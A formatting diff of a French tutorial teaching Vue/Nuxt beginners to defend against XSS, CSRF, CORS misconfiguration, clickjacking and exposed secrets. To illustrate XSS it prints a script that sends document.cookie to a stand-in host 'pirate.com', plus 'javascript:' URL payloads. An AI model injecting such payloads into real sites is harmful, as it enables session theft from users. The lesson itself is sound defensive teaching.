@@ -4,9 +4,10 @@
 
 > **🔄 Rappel du cours précédent**
 > Avant de continuer, vérifie que tu peux répondre à ces questions :
+>
 > 1. Qu'est-ce qu'un JWT et à quoi sert-il ?
 > 2. Quelle est la différence entre access token et refresh token ?
-> 
+>
 > <details>
 > <summary>Vérifier mes réponses</summary>
 >
@@ -33,12 +34,12 @@ Même si tu vis dans un bon quartier (un serveur sécurisé), il faut quand mêm
 
 Voici les 4 attaques les plus courantes contre les applications web :
 
-| Menace | Analogie maison | Ce que ça fait |
-| --- | --- | --- |
-| **XSS** | Quelqu'un glisse un micro espion dans ta maison | Un pirate injecte du code malveillant dans ton site |
-| **CSRF** | Quelqu'un imite ta signature pour passer des commandes | Un site malveillant envoie des requêtes en se faisant passer pour toi |
-| **CORS mal configuré** | Tu laisses n'importe qui entrer par la porte de service | Ton serveur accepte des requêtes venant de n'importe quel site |
-| **Clickjacking** | On met une vitre invisible devant ta porte → tu crois appuyer sur ta sonnette mais tu ouvres à un inconnu | Ton site est chargé dans un cadre invisible, l'utilisateur clique sans le savoir |
+| Menace                 | Analogie maison                                                                                           | Ce que ça fait                                                                   |
+| ---------------------- | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
+| **XSS**                | Quelqu'un glisse un micro espion dans ta maison                                                           | Un pirate injecte du code malveillant dans ton site                              |
+| **CSRF**               | Quelqu'un imite ta signature pour passer des commandes                                                    | Un site malveillant envoie des requêtes en se faisant passer pour toi            |
+| **CORS mal configuré** | Tu laisses n'importe qui entrer par la porte de service                                                   | Ton serveur accepte des requêtes venant de n'importe quel site                   |
+| **Clickjacking**       | On met une vitre invisible devant ta porte → tu crois appuyer sur ta sonnette mais tu ouvres à un inconnu | Ton site est chargé dans un cadre invisible, l'utilisateur clique sans le savoir |
 
 ---
 
@@ -65,7 +66,7 @@ Imagine un champ de commentaire sur ton site. Un pirate écrit ceci comme commen
 <script>
   // Ce code malveillant s'exécutera chez tous les utilisateurs qui voient le commentaire !
   // Il vole le cookie de session et l'envoie au pirate
-  fetch('https://pirate.com/steal?cookie=' + document.cookie)
+  fetch("https://pirate.com/steal?cookie=" + document.cookie);
 </script>
 ```
 
@@ -73,7 +74,7 @@ Si ton site affiche ce commentaire tel quel, **le script s'exécute** dans le na
 
 ### Vue 3 te protège par défaut ! 🛡️
 
-Bonne nouvelle : Vue **échappe automatiquement** le contenu affiché avec les doubles accolades `{{ }}` :
+Bonne nouvelle : Vue **échappe automatiquement** le contenu affiché avec les doubles accolades `&#123;&#123; &#125;&#125;` :
 
 ```vue
 <template>
@@ -113,14 +114,14 @@ Bonne nouvelle : Vue **échappe automatiquement** le contenu affiché avec les d
 
 <!-- ✅ SOLUTION : Nettoyer le HTML AVANT de l'afficher -->
 <script setup lang="ts">
-import { computed } from 'vue'
-import DOMPurify from 'dompurify'
+import { computed } from "vue";
+import DOMPurify from "dompurify";
 // DOMPurify est une librairie qui "nettoie" le HTML
 // Elle enlève tout ce qui est dangereux (scripts, événements onclick, etc.)
 // mais garde le HTML inoffensif (gras, italique, liens...)
 
 // On prend le commentaire brut et on le passe au nettoyeur
-const safeHtml = computed(() => DOMPurify.sanitize(userComment.value))
+const safeHtml = computed(() => DOMPurify.sanitize(userComment.value));
 // sanitize = nettoyer / désinfecter
 // Comme un détecteur de métaux à l'entrée d'un bâtiment !
 </script>
@@ -133,19 +134,19 @@ const safeHtml = computed(() => DOMPurify.sanitize(userComment.value))
 
 ```ts
 // ❌ DANGEREUX : un utilisateur pourrait mettre une URL JavaScript malveillante
-const userUrl = 'javascript:alert("xss")'  // Ceci est une "URL" valide mais malveillante !
-const html = `<a href="${userUrl}">Cliquez ici</a>`
+const userUrl = 'javascript:alert("xss")'; // Ceci est une "URL" valide mais malveillante !
+const html = `<a href="${userUrl}">Cliquez ici</a>`;
 // Quand quelqu'un clique → le JavaScript s'exécute !
 
 // ✅ SOLUTION : Toujours vérifier que l'URL est vraiment une URL web
 function isValidUrl(url: string): boolean {
   try {
-    const parsed = new URL(url)            // On essaie de parser l'URL
-    return ['http:', 'https:'].includes(parsed.protocol)
+    const parsed = new URL(url); // On essaie de parser l'URL
+    return ["http:", "https:"].includes(parsed.protocol);
     // On n'accepte QUE les URLs qui commencent par http: ou https:
     // Donc "javascript:..." sera rejeté !
   } catch {
-    return false  // Si new URL() échoue, ce n'est pas une URL valide
+    return false; // Si new URL() échoue, ce n'est pas une URL valide
   }
 }
 ```
@@ -182,25 +183,24 @@ export async function csrfFetch(
   url: string,
   options: RequestInit = {},
 ): Promise<Response> {
-
   // Le serveur a mis un token CSRF dans un cookie lisible par JavaScript
   // On le lit depuis les cookies du navigateur
   const csrfToken = document.cookie
-    .split('; ')                              // Les cookies sont séparés par "; "
-    .find(c => c.startsWith('XSRF-TOKEN='))   // On cherche celui qui s'appelle XSRF-TOKEN
-    ?.split('=')[1]                           // On récupère la valeur après le "="
+    .split("; ") // Les cookies sont séparés par "; "
+    .find((c) => c.startsWith("XSRF-TOKEN=")) // On cherche celui qui s'appelle XSRF-TOKEN
+    ?.split("=")[1]; // On récupère la valeur après le "="
   // Le "?." (optional chaining) : si .find() ne trouve rien, on n'appelle pas .split()
 
   return fetch(url, {
-    ...options,                       // On garde les options existantes
-    credentials: 'include',          // On envoie les cookies avec la requête
+    ...options, // On garde les options existantes
+    credentials: "include", // On envoie les cookies avec la requête
     headers: {
-      ...options.headers,            // On garde les headers existants
-      'X-XSRF-TOKEN': csrfToken ?? '',  // On ajoute le token CSRF dans un header
+      ...options.headers, // On garde les headers existants
+      "X-XSRF-TOKEN": csrfToken ?? "", // On ajoute le token CSRF dans un header
       // Le serveur vérifie que ce header correspond au cookie
       // Le site pirate ne peut PAS lire nos cookies → il ne peut pas envoyer ce header !
     },
-  })
+  });
 }
 ```
 
@@ -210,15 +210,15 @@ export async function csrfFetch(
 // Côté serveur (pour info, tu ne coderas pas ça en front)
 // Le serveur configure ses cookies pour qu'ils ne soient PAS envoyés depuis d'autres sites
 
-res.cookie('session', token, {
-  httpOnly: true,       // Le cookie n'est PAS lisible par JavaScript
-                        // → Protège contre le vol de cookie par XSS
-  secure: true,         // Le cookie n'est envoyé QUE en HTTPS (pas en HTTP non chiffré)
-  sameSite: 'strict',   // Le cookie n'est PAS envoyé si la requête vient d'un AUTRE site
-                        // → Protège contre le CSRF !
-  maxAge: 3600000,      // Le cookie expire après 1 heure (en millisecondes)
-                        // 3 600 000 ms = 60 min × 60 sec × 1000 ms
-})
+res.cookie("session", token, {
+  httpOnly: true, // Le cookie n'est PAS lisible par JavaScript
+  // → Protège contre le vol de cookie par XSS
+  secure: true, // Le cookie n'est envoyé QUE en HTTPS (pas en HTTP non chiffré)
+  sameSite: "strict", // Le cookie n'est PAS envoyé si la requête vient d'un AUTRE site
+  // → Protège contre le CSRF !
+  maxAge: 3600000, // Le cookie expire après 1 heure (en millisecondes)
+  // 3 600 000 ms = 60 min × 60 sec × 1000 ms
+});
 ```
 
 ---
@@ -257,20 +257,20 @@ C'est configuré **côté serveur** (pas côté front), mais c'est important de 
 // composables/useValidation.ts
 // On utilise la librairie "zod" pour définir des règles de validation
 
-import { z } from 'zod'
+import { z } from "zod";
 // Zod permet de définir la "forme" attendue des données
 // et de vérifier si les données correspondent
 
 // Règle pour l'email : doit être une chaîne de caractères au format email
-const emailSchema = z.string().email('Email invalide')
+const emailSchema = z.string().email("Email invalide");
 
 // Règles pour le mot de passe : plusieurs critères
 const passwordSchema = z
   .string()
-  .min(8, '8 caractères minimum')                // Au moins 8 caractères
-  .regex(/[A-Z]/, '1 majuscule requise')          // Au moins une lettre majuscule
-  .regex(/[0-9]/, '1 chiffre requis')             // Au moins un chiffre
-  .regex(/[^a-zA-Z0-9]/, '1 caractère spécial requis')  // Au moins un symbole (!@#$...)
+  .min(8, "8 caractères minimum") // Au moins 8 caractères
+  .regex(/[A-Z]/, "1 majuscule requise") // Au moins une lettre majuscule
+  .regex(/[0-9]/, "1 chiffre requis") // Au moins un chiffre
+  .regex(/[^a-zA-Z0-9]/, "1 caractère spécial requis"); // Au moins un symbole (!@#$...)
 
 // Rappel regex (expressions régulières) :
 // /[A-Z]/         → cherche AU MOINS une lettre entre A et Z (majuscule)
@@ -278,24 +278,23 @@ const passwordSchema = z
 // /[^a-zA-Z0-9]/  → cherche AU MOINS un caractère qui N'EST PAS une lettre ou un chiffre
 
 export function useValidation() {
-
   // Vérifie un email. Retourne null si OK, ou un message d'erreur
   function validateEmail(email: string): string | null {
-    const result = emailSchema.safeParse(email)
+    const result = emailSchema.safeParse(email);
     // safeParse essaie de valider sans lancer d'erreur
     // result.success = true si c'est valide, false sinon
-    return result.success ? null : result.error.issues[0].message
+    return result.success ? null : result.error.issues[0].message;
     // Si valide → null (pas d'erreur)
     // Si invalide → on retourne le premier message d'erreur
   }
 
   // Vérifie un mot de passe. Même logique.
   function validatePassword(password: string): string | null {
-    const result = passwordSchema.safeParse(password)
-    return result.success ? null : result.error.issues[0].message
+    const result = passwordSchema.safeParse(password);
+    return result.success ? null : result.error.issues[0].message;
   }
 
-  return { validateEmail, validatePassword }
+  return { validateEmail, validatePassword };
 }
 ```
 
@@ -309,7 +308,7 @@ export function useValidation() {
 
 ```ts
 // ❌ JAMAIS DE SECRETS DANS LE CODE FRONT !
-const API_KEY = 'sk-1234567890'  // DANGER ! Cette valeur sera visible dans le bundle JS
+const API_KEY = "sk-1234567890"; // DANGER ! Cette valeur sera visible dans le bundle JS
 // N'importe qui peut ouvrir les outils de développement du navigateur (F12)
 // et voir cette valeur dans le code source !
 
@@ -327,14 +326,14 @@ const API_KEY = 'sk-1234567890'  // DANGER ! Cette valeur sera visible dans le b
 
 ```ts
 // ✅ Accéder aux variables publiques dans ton code Vue/Vite
-const apiBase = import.meta.env.VITE_API_BASE
+const apiBase = import.meta.env.VITE_API_BASE;
 // import.meta.env contient toutes les variables d'environnement VITE_*
 // Au moment du build, Vite remplace ces valeurs directement dans le code
 
 // ✅ Avec Nuxt : runtimeConfig
-const config = useRuntimeConfig()
-const publicBase = config.public.apiBase  // Accessible côté client (public)
-const secret = config.apiSecret           // Accessible UNIQUEMENT côté serveur (Nuxt SSR)
+const config = useRuntimeConfig();
+const publicBase = config.public.apiBase; // Accessible côté client (public)
+const secret = config.apiSecret; // Accessible UNIQUEMENT côté serveur (Nuxt SSR)
 ```
 
 ---
@@ -378,12 +377,12 @@ Utilise cette liste pour vérifier la sécurité de ton application :
 
 ## 📝 Résumé
 
-| Menace | C'est quoi ? | Comment se protéger |
-| --- | --- | --- |
-| **XSS** | Du code malveillant injecté dans ton site | Vue échappe par défaut. Éviter `v-html`. Utiliser DOMPurify si besoin |
-| **CSRF** | Un site pirate envoie des requêtes en ton nom | Token CSRF + cookies SameSite |
-| **CORS** | Un site non autorisé essaie d'appeler ton API | Configurer le serveur pour n'accepter que tes origines |
-| **Secrets exposés** | Clés API visibles dans le code front | Ne jamais mettre de secrets dans le code client |
+| Menace              | C'est quoi ?                                  | Comment se protéger                                                   |
+| ------------------- | --------------------------------------------- | --------------------------------------------------------------------- |
+| **XSS**             | Du code malveillant injecté dans ton site     | Vue échappe par défaut. Éviter `v-html`. Utiliser DOMPurify si besoin |
+| **CSRF**            | Un site pirate envoie des requêtes en ton nom | Token CSRF + cookies SameSite                                         |
+| **CORS**            | Un site non autorisé essaie d'appeler ton API | Configurer le serveur pour n'accepter que tes origines                |
+| **Secrets exposés** | Clés API visibles dans le code front          | Ne jamais mettre de secrets dans le code client                       |
 
 ---
 
@@ -409,6 +408,7 @@ const userComment = '<script>alert("hack!")</script>'
 ❌ **Non sécurisé** : `v-html` avec du contenu utilisateur = faille XSS.
 
 ✅ **Solution avec DOMPurify** :
+
 ```vue
 <template>
   <div v-html="sanitizedComment"></div>
@@ -421,6 +421,7 @@ const sanitizedComment = DOMPurify.sanitize(userComment)
 // Retourne le texte sans le script malveillant
 </script>
 ```
+
 </details>
 
 ---
@@ -430,7 +431,7 @@ const sanitizedComment = DOMPurify.sanitize(userComment)
 Cette URL utilisateur est-elle sécurisée ?
 
 ```ts
-const userUrl = 'javascript:alert(document.cookie)'
+const userUrl = "javascript:alert(document.cookie)";
 ```
 
 Comment valider les URLs ?
@@ -441,16 +442,18 @@ Comment valider les URLs ?
 ❌ **Dangereux** : `javascript:` exécute du code !
 
 ✅ **Validation** :
+
 ```ts
 function isSafeUrl(url: string): boolean {
   try {
-    const parsed = new URL(url)
-    return ['http:', 'https:'].includes(parsed.protocol)
+    const parsed = new URL(url);
+    return ["http:", "https:"].includes(parsed.protocol);
   } catch {
-    return false
+    return false;
   }
 }
 ```
+
 </details>
 
 ---
@@ -474,6 +477,7 @@ DATABASE_URL=postgres://user:pass@db
 - ✅ `DATABASE_URL` : Sans préfixe `VITE_`, elle n'est PAS accessible côté front
 
 **Règle** : Jamais de secrets dans les variables `VITE_*` !
+
 </details>
 
 ---
